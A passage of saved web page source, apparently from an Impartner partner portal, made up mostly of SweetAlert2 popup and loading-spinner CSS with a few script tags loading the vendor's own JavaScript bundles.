    .swal2-popup .swal2-input.swal2-inputerror,
    .swal2-popup .swal2-file.swal2-inputerror,
    .swal2-popup .swal2-textarea.swal2-inputerror {
      border-color: #f27474 !important;
      box-shadow: 0 0 2px #f27474 !important; }
    .swal2-popup .swal2-input:focus,
    .swal2-popup .swal2-file:focus,
    .swal2-popup .swal2-textarea:focus {
      border: 1px solid #b4dbed;
      outline: none;
      box-shadow: 0 0 3px #c4e6f5; }
    .swal2-popup .swal2-input::-webkit-input-placeholder,
    .swal2-popup .swal2-file::-webkit-input-placeholder,
    .swal2-popup .swal2-textarea::-webkit-input-placeholder {
      color: #cccccc; }
    .swal2-popup .swal2-input:-ms-input-placeholder,
    .swal2-popup .swal2-file:-ms-input-placeholder,
    .swal2-popup .swal2-textarea:-ms-input-placeholder {
      color: #cccccc; }
    .swal2-popup .swal2-input::-ms-input-placeholder,
    .swal2-popup .swal2-file::-ms-input-placeholder,
    .swal2-popup .swal2-textarea::-ms-input-placeholder {
      color: #cccccc; }
    .swal2-popup .swal2-input::placeholder,
    .swal2-popup .swal2-file::placeholder,
    .swal2-popup .swal2-textarea::placeholder {
      color: #cccccc; }
  .swal2-popup .swal2-range input {
    width: 80%; }
  .swal2-popup .swal2-range output {
    width: 20%;
    font-weight: 600;
    text-align: center; }
  .swal2-popup .swal2-range input,
  .swal2-popup .swal2-range output {
    height: 2.625em;
    margin: 1em auto;
    padding: 0;
    font-size: 1.125em;
    line-height: 2.625em; }
  .swal2-popup .swal2-input {
    height: 2.625em;
    padding: 0.75em; }
    .swal2-popup .swal2-input[type='number'] {
      max-width: 10em; }
  .swal2-popup .swal2-file {
    font-size: 1.125em; }
  .swal2-popup .swal2-textarea {
    height: 6.75em;
    padding: 0.75em; }
  .swal2-popup .swal2-select {
    min-width: 50%;
    max-width: 100%;
    padding: .375em .625em;
    color: #545454;
    font-size: 1.125em; }
  .swal2-popup .swal2-radio,
  .swal2-popup .swal2-checkbox {
    align-items: center;
    justify-content: center; }
    .swal2-popup .swal2-radio label,
    .swal2-popup .swal2-checkbox label {
      margin: 0 .6em;
      font-size: 1.125em; }
    .swal2-popup .swal2-radio input,
    .swal2-popup .swal2-checkbox input {
      margin: 0 .4em; }
  .swal2-popup .swal2-validationerror {
    display: none;
    align-items: center;
    justify-content: center;
    padding: 0.625em;
    background: #f0f0f0;
    color: #666666;
    font-size: 1em;
    font-weight: 300;
    overflow: hidden; }
    .swal2-popup .swal2-validationerror::before {
      display: inline-block;
      width: 1.5em;
      height: 1.5em;
      margin: 0 .625em;
      border-radius: 50%;
      background-color: #f27474;
      color: #fff;
      font-weight: 600;
      line-height: 1.5em;
      text-align: center;
      content: '!';
      zoom: normal; }

@supports (-ms-accelerator: true) {
  .swal2-range input {
    width: 100% !important; }
  .swal2-range output {
    display: none; } }

@media all and (-ms-high-contrast: none), (-ms-high-contrast: active) {
  .swal2-range input {
    width: 100% !important; }
  .swal2-range output {
    display: none; } }

.swal2-icon {
  position: relative;
  justify-content: center;
  width: 5em;
  height: 5em;
  margin: 1.25em auto 1.875em;
  border: .25em solid transparent;
  border-radius: 50%;
  line-height: 5em;
  cursor: default;
  box-sizing: content-box;
  -webkit-user-select: none;
     -moz-user-select: none;
      -ms-user-select: none;
          user-select: none;
  zoom: normal; }
  .swal2-icon-text {
    font-size: 3.75em; }
  .swal2-icon.swal2-error {
    border-color: #f27474; }
    .swal2-icon.swal2-error .swal2-x-mark {
      position: relative;
      flex-grow: 1; }
    .swal2-icon.swal2-error [class^='swal2-x-mark-line'] {
      display: block;
      position: absolute;
      top: 2.3125em;
      width: 2.9375em;
      height: .3125em;
      border-radius: .125em;
      background-color: #f27474; }
      .swal2-icon.swal2-error [class^='swal2-x-mark-line'][class$='left'] {
        left: 1.0625em;
        -webkit-transform: rotate(45deg);
                transform: rotate(45deg); }
      .swal2-icon.swal2-error [class^='swal2-x-mark-line'][class$='right'] {
        right: 1em;
        -webkit-transform: rotate(-45deg);
                transform: rotate(-45deg); }
  .swal2-icon.swal2-warning {
    border-color: #facea8;
    color: #f8bb86; }
  .swal2-icon.swal2-info {
    border-color: #9de0f6;
    color: #3fc3ee; }
  .swal2-icon.swal2-question {
    border-color: #c9dae1;
    color: #87adbd; }
  .swal2-icon.swal2-success {
    border-color: #a5dc86; }
    .swal2-icon.swal2-success [class^='swal2-success-circular-line'] {
      position: absolute;
      width: 3.75em;
      height: 7.5em;
      -webkit-transform: rotate(45deg);
              transform: rotate(45deg);
      border-radius: 50%; }
      .swal2-icon.swal2-success [class^='swal2-success-circular-line'][class$='left'] {
        top: -.4375em;
        left: -2.0635em;
        -webkit-transform: rotate(-45deg);
                transform: rotate(-45deg);
        -webkit-transform-origin: 3.75em 3.75em;
                transform-origin: 3.75em 3.75em;
        border-radius: 7.5em 0 0 7.5em; }
      .swal2-icon.swal2-success [class^='swal2-success-circular-line'][class$='right'] {
        top: -.6875em;
        left: 1.875em;
        -webkit-transform: rotate(-45deg);
                transform: rotate(-45deg);
        -webkit-transform-origin: 0 3.75em;
                transform-origin: 0 3.75em;
        border-radius: 0 7.5em 7.5em 0; }
    .swal2-icon.swal2-success .swal2-success-ring {
      position: absolute;
      top: -.25em;
      left: -.25em;
      width: 100%;
      height: 100%;
      border: 0.25em solid rgba(165, 220, 134, 0.3);
      border-radius: 50%;
      z-index: 2;
      box-sizing: content-box; }
    .swal2-icon.swal2-success .swal2-success-fix {
      position: absolute;
      top: .5em;
      left: 1.625em;
      width: .4375em;
      height: 5.625em;
      -webkit-transform: rotate(-45deg);
              transform: rotate(-45deg);
      z-index: 1; }
    .swal2-icon.swal2-success [class^='swal2-success-line'] {
      display: block;
      position: absolute;
      height: .3125em;
      border-radius: .125em;
      background-color: #a5dc86;
      z-index: 2; }
      .swal2-icon.swal2-success [class^='swal2-success-line'][class$='tip'] {
        top: 2.875em;
        left: .875em;
        width: 1.5625em;
        -webkit-transform: rotate(45deg);
                transform: rotate(45deg); }
      .swal2-icon.swal2-success [class^='swal2-success-line'][class$='long'] {
        top: 2.375em;
        right: .5em;
        width: 2.9375em;
        -webkit-transform: rotate(-45deg);
                transform: rotate(-45deg); }

.swal2-progresssteps {
  align-items: center;
  margin: 0 0 1.25em;
  padding: 0;
  font-weight: 600; }
  .swal2-progresssteps li {
    display: inline-block;
    position: relative; }
  .swal2-progresssteps .swal2-progresscircle {
    width: 2em;
    height: 2em;
    border-radius: 2em;
    background: #3085d6;
    color: #fff;
    line-height: 2em;
    text-align: center;
    z-index: 20; }
    .swal2-progresssteps .swal2-progresscircle:first-child {
      margin-left: 0; }
    .swal2-progresssteps .swal2-progresscircle:last-child {
      margin-right: 0; }
    .swal2-progresssteps .swal2-progresscircle.swal2-activeprogressstep {
      background: #3085d6; }
      .swal2-progresssteps .swal2-progresscircle.swal2-activeprogressstep ~ .swal2-progresscircle {
        background: #add8e6; }
      .swal2-progresssteps .swal2-progresscircle.swal2-activeprogressstep ~ .swal2-progressline {
        background: #add8e6; }
  .swal2-progresssteps .swal2-progressline {
    width: 2.5em;
    height: .4em;
    margin: 0 -1px;
    background: #3085d6;
    z-index: 10; }

[class^='swal2'] {
  -webkit-tap-highlight-color: transparent; }

.swal2-show {
  -webkit-animation: swal2-show 0.3s;
          animation: swal2-show 0.3s; }
  .swal2-show.swal2-noanimation {
    -webkit-animation: none;
            animation: none; }

.swal2-hide {
  -webkit-animation: swal2-hide 0.15s forwards;
          animation: swal2-hide 0.15s forwards; }
  .swal2-hide.swal2-noanimation {
    -webkit-animation: none;
            animation: none; }

[dir='rtl'] .swal2-close {
  right: auto;
  left: 0; }

.swal2-animate-success-icon .swal2-success-line-tip {
  -webkit-animation: swal2-animate-success-line-tip 0.75s;
          animation: swal2-animate-success-line-tip 0.75s; }

.swal2-animate-success-icon .swal2-success-line-long {
  -webkit-animation: swal2-animate-success-line-long 0.75s;
          animation: swal2-animate-success-line-long 0.75s; }

.swal2-animate-success-icon .swal2-success-circular-line-right {
  -webkit-animation: swal2-rotate-success-circular-line 4.25s ease-in;
          animation: swal2-rotate-success-circular-line 4.25s ease-in; }

.swal2-animate-error-icon {
  -webkit-animation: swal2-animate-error-icon 0.5s;
          animation: swal2-animate-error-icon 0.5s; }
  .swal2-animate-error-icon .swal2-x-mark {
    -webkit-animation: swal2-animate-error-x-mark 0.5s;
            animation: swal2-animate-error-x-mark 0.5s; }

@-webkit-keyframes swal2-rotate-loading {
  0% {
    -webkit-transform: rotate(0deg);
            transform: rotate(0deg); }
  100% {
    -webkit-transform: rotate(360deg);
            transform: rotate(360deg); } }

@keyframes swal2-rotate-loading {
  0% {
    -webkit-transform: rotate(0deg);
            transform: rotate(0deg); }
  100% {
    -webkit-transform: rotate(360deg);
            transform: rotate(360deg); } }</style><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="prm-bundles/portal-topbar-module" src="https://prod.impartner.live/scripts/../dist/portal-topbar-module.39de8b49c2d598e3a3d0.min.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="prm-bundles/page-content-module" src="https://prod.impartner.live/scripts/../dist/page-content-module.b9a98d7ae6376e691d09.min.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="prm/kobindings/enterkey" src="https://prod.impartner.live/scripts/prm/kobindings/enterkey.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="@impartner/ko-features/shared/common" src="https://prod.impartner.live/scripts/../dist/@impartner/ko-features/common.min.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="prm/kobindings/anchor-link-position-adjustment-ko" src="https://prod.impartner.live/scripts/prm/kobindings/anchor-link-position-adjustment-ko.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="prm/kobindings/render-bound-html-element-ko" src="https://prod.impartner.live/scripts/prm/kobindings/render-bound-html-element-ko.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><style type="text/css">[progress-indicator].indicator-container {
  text-align: center; }
  [progress-indicator].indicator-container .animation {
    margin: 10rem auto;
    font-size: 2.5rem;
    width: 2rem;
    height: 2rem;
    border-radius: 50%;
    position: relative;
    text-indent: -9999rem;
    -webkit-animation: load5 1.1s infinite ease;
            animation: load5 1.1s infinite ease;
    -webkit-transform: translateZ(0);
            transform: translateZ(0); }

@-webkit-keyframes load5 {
  0%,
  100% {
    -webkit-box-shadow: 0em -2.6em 0em 0em #515151, 1.8em -1.8em 0 0em rgba(81, 81, 81, 0.2), 2.5em 0em 0 0em rgba(81, 81, 81, 0.2), 1.75em 1.75em 0 0em rgba(81, 81, 81, 0.2), 0em 2.5em 0 0em rgba(81, 81, 81, 0.2), -1.8em 1.8em 0 0em rgba(81, 81, 81, 0.2), -2.6em 0em 0 0em rgba(81, 81, 81, 0.5), -1.8em -1.8em 0 0em rgba(81, 81, 81, 0.7);
            box-shadow: 0em -2.6em 0em 0em #515151, 1.8em -1.8em 0 0em rgba(81, 81, 81, 0.2), 2.5em 0em 0 0em rgba(81, 81, 81, 0.2), 1.75em 1.75em 0 0em rgba(81, 81, 81, 0.2), 0em 2.5em 0 0em rgba(81, 81, 81, 0.2), -1.8em 1.8em 0 0em rgba(81, 81, 81, 0.2), -2.6em 0em 0 0em rgba(81, 81, 81, 0.5), -1.8em -1.8em 0 0em rgba(81, 81, 81, 0.7); }
  12.5% {
    -webkit-box-shadow: 0em -2.6em 0em 0em rgba(81, 81, 81, 0.7), 1.8em -1.8em 0 0em #515151, 2.5em 0em 0 0em rgba(81, 81, 81, 0.2), 1.75em 1.75em 0 0em rgba(81, 81, 81, 0.2), 0em 2.5em 0 0em rgba(81, 81, 81, 0.2), -1.8em 1.8em 0 0em rgba(81, 81, 81, 0.2), -2.6em 0em 0 0em rgba(81, 81, 81, 0.2), -1.8em -1.8em 0 0em rgba(81, 81, 81, 0.5);
            box-shadow: 0em -2.6em 0em 0em rgba(81, 81, 81, 0.7), 1.8em -1.8em 0 0em #515151, 2.5em 0em 0 0em rgba(81, 81, 81, 0.2), 1.75em 1.75em 0 0em rgba(81, 81, 81, 0.2), 0em 2.5em 0 0em rgba(81, 81, 81, 0.2), -1.8em 1.8em 0 0em rgba(81, 81, 81, 0.2), -2.6em 0em 0 0em rgba(81, 81, 81, 0.2), -1.8em -1.8em 0 0em rgba(81, 81, 81, 0.5); }
  25% {
    -webkit-box-shadow: 0em -2.6em 0em 0em rgba(81, 81, 81, 0.5), 1.8em -1.8em 0 0em rgba(81, 81, 81, 0.7), 2.5em 0em 0 0em #515151, 1.75em 1.75em 0 0em rgba(81, 81, 81, 0.2), 0em 2.5em 0 0em rgba(81, 81, 81, 0.2), -1.8em 1.8em 0 0em rgba(81, 81, 81, 0.2), -2.6em 0em 0 0em rgba(81, 81, 81, 0.2), -1.8em -1.8em 0 0em rgba(81, 81, 81, 0.2);
            box-shadow: 0em -2.6em 0em 0em rgba(81, 81, 81, 0.5), 1.8em -1.8em 0 0em rgba(81, 81, 81, 0.7), 2.5em 0em 0 0em #515151, 1.75em 1.75em 0 0em rgba(81, 81, 81, 0.2), 0em 2.5em 0 0em rgba(81, 81, 81, 0.2), -1.8em 1.8em 0 0em rgba(81, 81, 81, 0.2), -2.6em 0em 0 0em rgba(81, 81, 81, 0.2), -1.8em -1.8em 0 0em rgba(81, 81, 81, 0.2); }
  37.5% {
    -webkit-box-shadow: 0em -2.6em 0em 0em rgba(81, 81, 81, 0.2), 1.8em -1.8em 0 0em rgba(81, 81, 81, 0.5), 2.5em 0em 0 0em rgba(81, 81, 81, 0.7), 1.75em 1.75em 0 0em #515151, 0em 2.5em 0 0em rgba(81, 81, 81, 0.2), -1.8em 1.8em 0 0em rgba(81, 81, 81, 0.2), -2.6em 0em 0 0em rgba(81, 81, 81, 0.2), -1.8em -1.8em 0 0em rgba(81, 81, 81, 0.2);
            box-shadow: 0em -2.6em 0em 0em rgba(81, 81, 81, 0.2), 1.8em -1.8em 0 0em rgba(81, 81, 81, 0.5), 2.5em 0em 0 0em rgba(81, 81, 81, 0.7), 1.75em 1.75em 0 0em #515151, 0em 2.5em 0 0em rgba(81, 81, 81, 0.2), -1.8em 1.8em 0 0em rgba(81, 81, 81, 0.2), -2.6em 0em 0 0em rgba(81, 81, 81, 0.2), -1.8em -1.8em 0 0em rgba(81, 81, 81, 0.2); }
  50% {
    -webkit-box-shadow: 0em -2.6em 0em 0em rgba(81, 81, 81, 0.2), 1.8em -1.8em 0 0em rgba(81, 81, 81, 0.2), 2.5em 0em 0 0em rgba(81, 81, 81, 0.5), 1.75em 1.75em 0 0em rgba(81, 81, 81, 0.7), 0em 2.5em 0 0em #515151, -1.8em 1.8em 0 0em rgba(81, 81, 81, 0.2), -2.6em 0em 0 0em rgba(81, 81, 81, 0.2), -1.8em -1.8em 0 0em rgba(81, 81, 81, 0.2);
            box-shadow: 0em -2.6em 0em 0em rgba(81, 81, 81, 0.2), 1.8em -1.8em 0 0em rgba(81, 81, 81, 0.2), 2.5em 0em 0 0em rgba(81, 81, 81, 0.5), 1.75em 1.75em 0 0em rgba(81, 81, 81, 0.7), 0em 2.5em 0 0em #515151, -1.8em 1.8em 0 0em rgba(81, 81, 81, 0.2), -2.6em 0em 0 0em rgba(81, 81, 81, 0.2), -1.8em -1.8em 0 0em rgba(81, 81, 81, 0.2); }
  62.5% {
    -webkit-box-shadow: 0em -2.6em 0em 0em rgba(81, 81, 81, 0.2), 1.8em -1.8em 0 0em rgba(81, 81, 81, 0.2), 2.5em 0em 0 0em rgba(81, 81, 81, 0.2), 1.75em 1.75em 0 0em rgba(81, 81, 81, 0.5), 0em 2.5em 0 0em rgba(81, 81, 81, 0.7), -1.8em 1.8em 0 0em #515151, -2.6em 0em 0 0em rgba(81, 81, 81, 0.2), -1.8em -1.8em 0 0em rgba(81, 81, 81, 0.2);
            box-shadow: 0em -2.6em 0em 0em rgba(81, 81, 81, 0.2), 1.8em -1.8em 0 0em rgba(81, 81, 81, 0.2), 2.5em 0em 0 0em rgba(81, 81, 81, 0.2), 1.75em 1.75em 0 0em rgba(81, 81, 81, 0.5), 0em 2.5em 0 0em rgba(81, 81, 81, 0.7), -1.8em 1.8em 0 0em #515151, -2.6em 0em 0 0em rgba(81, 81, 81, 0.2), -1.8em -1.8em 0 0em rgba(81, 81, 81, 0.2); }
  75% {
    -webkit-box-shadow: 0em -2.6em 0em 0em rgba(81, 81, 81, 0.2), 1.8em -1.8em 0 0em rgba(81, 81, 81, 0.2), 2.5em 0em 0 0em rgba(81, 81, 81, 0.2), 1.75em 1.75em 0 0em rgba(81, 81, 81, 0.2), 0em 2.5em 0 0em rgba(81, 81, 81, 0.5), -1.8em 1.8em 0 0em rgba(81, 81, 81, 0.7), -2.6em 0em 0 0em #515151, -1.8em -1.8em 0 0em rgba(81, 81, 81, 0.2);
            box-shadow: 0em -2.6em 0em 0em rgba(81, 81, 81, 0.2), 1.8em -1.8em 0 0em rgba(81, 81, 81, 0.2), 2.5em 0em 0 0em rgba(81, 81, 81, 0.2), 1.75em 1.75em 0 0em rgba(81, 81, 81, 0.2), 0em 2.5em 0 0em rgba(81, 81, 81, 0.5), -1.8em 1.8em 0 0em rgba(81, 81, 81, 0.7), -2.6em 0em 0 0em #515151, -1.8em -1.8em 0 0em rgba(81, 81, 81, 0.2); }
  87.5% {
    -webkit-box-shadow: 0em -2.6em 0em 0em rgba(81, 81, 81, 0.2), 1.8em -1.8em 0 0em rgba(81, 81, 81, 0.2), 2.5em 0em 0 0em rgba(81, 81, 81, 0.2), 1.75em 1.75em 0 0em rgba(81, 81, 81, 0.2), 0em 2.5em 0 0em rgba(81, 81, 81, 0.2), -1.8em 1.8em 0 0em rgba(81, 81, 81, 0.5), -2.6em 0em 0 0em rgba(81, 81, 81, 0.7), -1.8em -1.8em 0 0em #515151;
            box-shadow: 0em -2.6em 0em 0em rgba(81, 81, 81, 0.2), 1.8em -1.8em 0 0em rgba(81, 81, 81, 0.2), 2.5em 0em 0 0em rgba(81, 81, 81, 0.2), 1.75em 1.75em 0 0em rgba(81, 81, 81, 0.2), 0em 2.5em 0 0em rgba(81, 81, 81, 0.2), -1.8em 1.8em 0 0em rgba(81, 81, 81, 0.5), -2.6em 0em 0 0em rgba(81, 81, 81, 0.7), -1.8em -1.8em 0 0em #515151; } }

@keyframes load5 {
  0%,
  100% {
    -webkit-box-shadow: 0em -2.6em 0em 0em #515151, 1.8em -1.8em 0 0em rgba(81, 81, 81, 0.2), 2.5em 0em 0 0em rgba(81, 81, 81, 0.2), 1.75em 1.75em 0 0em rgba(81, 81, 81, 0.2), 0em 2.5em 0 0em rgba(81, 81, 81, 0.2), -1.8em 1.8em 0 0em rgba(81, 81, 81, 0.2), -2.6em 0em 0 0em rgba(81, 81, 81, 0.5), -1.8em -1.8em 0 0em rgba(81, 81, 81, 0.7);
            box-shadow: 0em -2.6em 0em 0em #515151, 1.8em -1.8em 0 0em rgba(81, 81, 81, 0.2), 2.5em 0em 0 0em rgba(81, 81, 81, 0.2), 1.75em 1.75em 0 0em rgba(81, 81, 81, 0.2), 0em 2.5em 0 0em rgba(81, 81, 81, 0.2), -1.8em 1.8em 0 0em rgba(81, 81, 81, 0.2), -2.6em 0em 0 0em rgba(81, 81, 81, 0.5), -1.8em -1.8em 0 0em rgba(81, 81, 81, 0.7); }
  12.5% {
    -webkit-box-shadow: 0em -2.6em 0em 0em rgba(81, 81, 81, 0.7), 1.8em -1.8em 0 0em #515151, 2.5em 0em 0 0em rgba(81, 81, 81, 0.2), 1.75em 1.75em 0 0em rgba(81, 81, 81, 0.2), 0em 2.5em 0 0em rgba(81, 81, 81, 0.2), -1.8em 1.8em 0 0em rgba(81, 81, 81, 0.2), -2.6em 0em 0 0em rgba(81, 81, 81, 0.2), -1.8em -1.8em 0 0em rgba(81, 81, 81, 0.5);
            box-shadow: 0em -2.6em 0em 0em rgba(81, 81, 81, 0.7), 1.8em -1.8em 0 0em #515151, 2.5em 0em 0 0em rgba(81, 81, 81, 0.2), 1.75em 1.75em 0 0em rgba(81, 81, 81, 0.2), 0em 2.5em 0 0em rgba(81, 81, 81, 0.2), -1.8em 1.8em 0 0em rgba(81, 81, 81, 0.2), -2.6em 0em 0 0em rgba(81, 81, 81, 0.2), -1.8em -1.8em 0 0em rgba(81, 81, 81, 0.5); }
  25% {
    -webkit-box-shadow: 0em -2.6em 0em 0em rgba(81, 81, 81, 0.5), 1.8em -1.8em 0 0em rgba(81, 81, 81, 0.7), 2.5em 0em 0 0em #515151, 1.75em 1.75em 0 0em rgba(81, 81, 81, 0.2), 0em 2.5em 0 0em rgba(81, 81, 81, 0.2), -1.8em 1.8em 0 0em rgba(81, 81, 81, 0.2), -2.6em 0em 0 0em rgba(81, 81, 81, 0.2), -1.8em -1.8em 0 0em rgba(81, 81, 81, 0.2);
            box-shadow: 0em -2.6em 0em 0em rgba(81, 81, 81, 0.5), 1.8em -1.8em 0 0em rgba(81, 81, 81, 0.7), 2.5em 0em 0 0em #515151, 1.75em 1.75em 0 0em rgba(81, 81, 81, 0.2), 0em 2.5em 0 0em rgba(81, 81, 81, 0.2), -1.8em 1.8em 0 0em rgba(81, 81, 81, 0.2), -2.6em 0em 0 0em rgba(81, 81, 81, 0.2), -1.8em -1.8em 0 0em rgba(81, 81, 81, 0.2); }
  37.5% {
    -webkit-box-shadow: 0em -2.6em 0em 0em rgba(81, 81, 81, 0.2), 1.8em -1.8em 0 0em rgba(81, 81, 81, 0.5), 2.5em 0em 0 0em rgba(81, 81, 81, 0.7), 1.75em 1.75em 0 0em #515151, 0em 2.5em 0 0em rgba(81, 81, 81, 0.2), -1.8em 1.8em 0 0em rgba(81, 81, 81, 0.2), -2.6em 0em 0 0em rgba(81, 81, 81, 0.2), -1.8em -1.8em 0 0em rgba(81, 81, 81, 0.2);
            box-shadow: 0em -2.6em 0em 0em rgba(81, 81, 81, 0.2), 1.8em -1.8em 0 0em rgba(81, 81, 81, 0.5), 2.5em 0em 0 0em rgba(81, 81, 81, 0.7), 1.75em 1.75em 0 0em #515151, 0em 2.5em 0 0em rgba(81, 81, 81, 0.2), -1.8em 1.8em 0 0em rgba(81, 81, 81, 0.2), -2.6em 0em 0 0em rgba(81, 81, 81, 0.2), -1.8em -1.8em 0 0em rgba(81, 81, 81, 0.2); }
  50% {
    -webkit-box-shadow: 0em -2.6em 0em 0em rgba(81, 81, 81, 0.2), 1.8em -1.8em 0 0em rgba(81, 81, 81, 0.2), 2.5em 0em 0 0em rgba(81, 81, 81, 0.5), 1.75em 1.75em 0 0em rgba(81, 81, 81, 0.7), 0em 2.5em 0 0em #515151, -1.8em 1.8em 0 0em rgba(81, 81, 81, 0.2), -2.6em 0em 0 0em rgba(81, 81, 81, 0.2), -1.8em -1.8em 0 0em rgba(81, 81, 81, 0.2);
            box-shadow: 0em -2.6em 0em 0em rgba(81, 81, 81, 0.2), 1.8em -1.8em 0 0em rgba(81, 81, 81, 0.2), 2.5em 0em 0 0em rgba(81, 81, 81, 0.5), 1.75em 1.75em 0 0em rgba(81, 81, 81, 0.7), 0em 2.5em 0 0em #515151, -1.8em 1.8em 0 0em rgba(81, 81, 81, 0.2), -2.6em 0em 0 0em rgba(81, 81, 81, 0.2), -1.8em -1.8em 0 0em rgba(81, 81, 81, 0.2); }
  62.5% {
    -webkit-box-shadow: 0em -2.6em 0em 0em rgba(81, 81, 81, 0.2), 1.8em -1.8em 0 0em rgba(81, 81, 81, 0.2), 2.5em 0em 0 0em rgba(81, 81, 81, 0.2), 1.75em 1.75em 0 0em rgba(81, 81, 81, 0.5), 0em 2.5em 0 0em rgba(81, 81, 81, 0.7), -1.8em 1.8em 0 0em #515151, -2.6em 0em 0 0em rgba(81, 81, 81, 0.2), -1.8em -1.8em 0 0em rgba(81, 81, 81, 0.2);
            box-shadow: 0em -2.6em 0em 0em rgba(81, 81, 81, 0.2), 1.8em -1.8em 0 0em rgba(81, 81, 81, 0.2), 2.5em 0em 0 0em rgba(81, 81, 81, 0.2), 1.75em 1.75em 0 0em rgba(81, 81, 81, 0.5), 0em 2.5em 0 0em rgba(81, 81, 81, 0.7), -1.8em 1.8em 0 0em #515151, -2.6em 0em 0 0em rgba(81, 81, 81, 0.2), -1.8em -1.8em 0 0em rgba(81, 81, 81, 0.2); }
  75% {
    -webkit-box-shadow: 0em -2.6em 0em 0em rgba(81, 81, 81, 0.2), 1.8em -1.8em 0 0em rgba(81, 81, 81, 0.2), 2.5em 0em 0 0em rgba(81, 81, 81, 0.2), 1.75em 1.75em 0 0em rgba(81, 81, 81, 0.2), 0em 2.5em 0 0em rgba(81, 81, 81, 0.5), -1.8em 1.8em 0 0em rgba(81, 81, 81, 0.7), -2.6em 0em 0 0em #515151, -1.8em -1.8em 0 0em rgba(81, 81, 81, 0.2);
            box-shadow: 0em -2.6em 0em 0em rgba(81, 81, 81, 0.2), 1.8em -1.8em 0 0em rgba(81, 81, 81, 0.2), 2.5em 0em 0 0em rgba(81, 81, 81, 0.2), 1.75em 1.75em 0 0em rgba(81, 81, 81, 0.2), 0em 2.5em 0 0em rgba(81, 81, 81, 0.5), -1.8em 1.8em 0 0em rgba(81, 81, 81, 0.7), -2.6em 0em 0 0em #515151, -1.8em -1.8em 0 0em rgba(81, 81, 81, 0.2); }
  87.5% {
    -webkit-box-shadow: 0em -2.6em 0em 0em rgba(81, 81, 81, 0.2), 1.8em -1.8em 0 0em rgba(81, 81, 81, 0.2), 2.5em 0em 0 0em rgba(81, 81, 81, 0.2), 1.75em 1.75em 0 0em rgba(81, 81, 81, 0.2), 0em 2.5em 0 0em rgba(81, 81, 81, 0.2), -1.8em 1.8em 0 0em rgba(81, 81, 81, 0.5), -2.6em 0em 0 0em rgba(81, 81, 81, 0.7), -1.8em -1.8em 0 0em #515151;
            box-shadow: 0em -2.6em 0em 0em rgba(81, 81, 81, 0.2), 1.8em -1.8em 0 0em rgba(81, 81, 81, 0.2), 2.5em 0em 0 0em rgba(81, 81, 81, 0.2), 1.75em 1.75em 0 0em rgba(81, 81, 81, 0.2), 0em 2.5em 0 0em rgba(81, 81, 81, 0.2), -1.8em 1.8em 0 0em rgba(81, 81, 81, 0.5), -2.6em 0em 0 0em rgba(81, 81, 81, 0.7), -1.8em -1.8em 0 0em #515151; } }
[field-required-indicator].asterisk-icon {
  height: 1.3rem;
  width: 1.3rem; }
  [field-required-indicator].asterisk-icon.red-background {
    color: #a12125; }
</style><style>@-webkit-keyframes swal2-show {
  0% {
    -webkit-transform: scale(0.7);
            transform: scale(0.7); }
  45% {
    -webkit-transform: scale(1.05);
            transform: scale(1.05); }
  80% {
    -webkit-transform: scale(0.95);
            transform: scale(0.95); }
  100% {
    -webkit-transform: scale(1);
            transform: scale(1); } }

@keyframes swal2-show {
  0% {
    -webkit-transform: scale(0.7);
            transform: scale(0.7); }
  45% {
    -webkit-transform: scale(1.05);
            transform: scale(1.05); }
  80% {
    -webkit-transform: scale(0.95);
            transform: scale(0.95); }
  100% {
    -webkit-transform: scale(1);
            transform: scale(1); } }

@-webkit-keyframes swal2-hide {
  0% {
    -webkit-transform: scale(1);
            transform: scale(1);
    opacity: 1; }
  100% {
    -webkit-transform: scale(0.5);
            transform: scale(0.5);
    opacity: 0; } }

@keyframes swal2-hide {
  0% {
    -webkit-transform: scale(1);
            transform: scale(1);
    opacity: 1; }
  100% {
    -webkit-transform: scale(0.5);
            transform: scale(0.5);
    opacity: 0; } }

@-webkit-keyframes swal2-animate-success-line-tip {
  0% {
    top: 1.1875em;
    left: .0625em;
    width: 0; }
  54% {
    top: 1.0625em;
    left: .125em;
    width: 0; }
  70% {
    top: 2.1875em;
    left: -.375em;
    width: 3.125em; }
  84% {
    top: 3em;
    left: 1.3125em;
    width: 1.0625em; }
  100% {
    top: 2.8125em;
    left: .875em;
    width: 1.5625em; } }

@keyframes swal2-animate-success-line-tip {
  0% {
    top: 1.1875em;
    left: .0625em;
    width: 0; }
  54% {
    top: 1.0625em;
    left: .125em;
    width: 0; }
  70% {
    top: 2.1875em;
    left: -.375em;
    width: 3.125em; }
  84% {
    top: 3em;
    left: 1.3125em;
    width: 1.0625em; }
  100% {
    top: 2.8125em;
    left: .875em;
    width: 1.5625em; } }

@-webkit-keyframes swal2-animate-success-line-long {
  0% {
    top: 3.375em;
    right: 2.875em;
    width: 0; }
  65% {
    top: 3.375em;
    right: 2.875em;
    width: 0; }
  84% {
    top: 2.1875em;
    right: 0;
    width: 3.4375em; }
  100% {
    top: 2.375em;
    right: .5em;
    width: 2.9375em; } }

@keyframes swal2-animate-success-line-long {
  0% {
    top: 3.375em;
    right: 2.875em;
    width: 0; }
  65% {
    top: 3.375em;
    right: 2.875em;
    width: 0; }
  84% {
    top: 2.1875em;
    right: 0;
    width: 3.4375em; }
  100% {
    top: 2.375em;
    right: .5em;
    width: 2.9375em; } }

@-webkit-keyframes swal2-rotate-success-circular-line {
  0% {
    -webkit-transform: rotate(-45deg);
            transform: rotate(-45deg); }
  5% {
